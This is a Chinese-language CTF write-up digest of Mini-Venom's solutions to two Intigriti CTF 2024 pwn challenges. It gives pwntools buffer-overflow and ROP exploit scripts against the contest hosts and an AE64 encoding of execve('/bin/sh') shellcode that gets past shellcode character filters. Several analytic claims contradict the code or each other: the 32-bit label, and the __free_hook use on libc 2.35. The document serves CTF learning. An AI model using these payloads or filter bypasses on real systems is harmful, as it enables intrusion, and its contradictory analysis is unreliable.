---
title: Intigriti CTF 2024 by Mini-Venom
contest: Intigriti
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags: [ret2libc, AE64 shellcode, libc-2.23, libc-2.35, Retro2Win, RiggedSlot]
attack_chain: |
  1. RiggedSlot: 入口 name 20 字节 + p32(0x14684d) + p32(1) → buffer overflow + GOT patch
     - per spin: 1 → 触发 win condition
  2. Retro2Win: libc 2.23 + option 1337 + cheatcode 0x10 padding + p64(0x602070+0x500) + p64(0x40076A)
     - 0x602070+0x500 是 BSS 写入目标, 0x40076A 是 ROP gadget
     - rdi=0x00000000004009b3, main=0x4008B7
  3. AE64 shellcode 编码: from ae64 import AE64 用于绕过 shellcode 字符过滤
  4. libc 2.23 模板 ret2libc + libc 2.35 模板 __free_hook / __malloc_hook 替换
key_payload: |
  # RiggedSlot:
  payload = b'a'*20 + p32(0x14684d) + p32(1)
  sl(payload)
  sl(str(1))  # per spin 1
  inter()
  
  # Retro2Win (libc 2.23):
  rdi = 0x00000000004009b3
  main = 0x4008B7
  rl("Select an option:")
  sl(str(1337))
  rl("Enter your cheatcode:")
  payload = b'\x00'*(0x10) + p64(0x602070+0x500) + p64(0x40076A)
  sl(payload)
  inter()
  
  # AE64 编码 (绕过 shellcode 字符过滤):
  from ae64 import AE64
  sc = AE64().encode(b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")
one_liner: Intigriti CTF 2024 Mini-Venom 战队的 Pwn 题合集 (RiggedSlot / Retro2Win)，ret2libc + AE64 shellcode 编码。
lesson: |
  - RiggedSlot: 简单 buffer overflow + option 选择触发 win
  - Retro2Win: 32-bit PIE disable + ret2libc 模板 + BSS 写 ROP 链
  - AE64 库: 把 shellcode 编码为可打印 ASCII (绕过字符过滤)，运行时再解码执行
  - libc 2.23 vs 2.35: 2.23 有 __free_hook/__malloc_hook，2.35 已禁用
quality: medium
---

# Intigriti CTF 2024 by Mini-Venom

> 来源: ctfiot.com 215809

## 招新文 (重复内容)

> ChaMd5 Venom 招新: admin@chamd5.org, RE/Crypto/Pwn/Misc/合约 + IoT/Car/工控/样本分析

## RiggedSlot (Pwn 入门)

```python
from pwn import *
from ae64 import AE64

context(os='linux', arch='amd64', log_level='debug')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')
p = remote('riggedslot2.ctf.intigriti.io', 1337)

rl("Enter your name:")
payload = b'a'*20 + p32(0x14684d) + p32(1)
sl(payload)
rl("per spin): ")
sl(str(1))
inter()
```

**分析：** `0x14684d` 是 win 函数地址，`p32(1)` 触发 win 条件。

## Retro2Win (libc 2.23 Pwn)

```python
context(os='linux', arch='amd64', log_level='debug')
libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so')
elf = ELF('./pwn')
p = remote('retro2win.ctf.intigriti.io', 1338)

rdi = 0x00000000004009b3
main = 0x4008B7

rl("Select an option:")
sl(str(1337))
rl("Enter your cheatcode:")
payload = b'\x00'*(0x10) + p64(0x602070+0x500) + p64(0x40076A)
sl(payload)
inter()
```

**分析：**
- 选 1337 触发 cheatcode 模式
- cheatcode 写入 0x10 字节 padding + BSS 0x602070+0x500 (写入目标) + ROP gadget 0x40076A
- 32 位 ret2libc 模板

## AE64 Shellcode 编码

```python
from ae64 import AE64
sc = AE64().encode(b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")
# 编码后是 ASCII 字符, 可绕过 shellcode 字符过滤
```

## 评价

Mini-Venom 战队的 Intigriti CTF 2024 速查文，主要是 Pwn 入门 + 招新广告。两道 Pwn 都不难：
- RiggedSlot: 简单 buffer overflow + option 触发 win
- Retro2Win: 32 位 PIE disable + ret2libc

`AE64` 库是亮点，把任意 shellcode 编码为可打印 ASCII，绕过任何 shellcode 字符过滤。
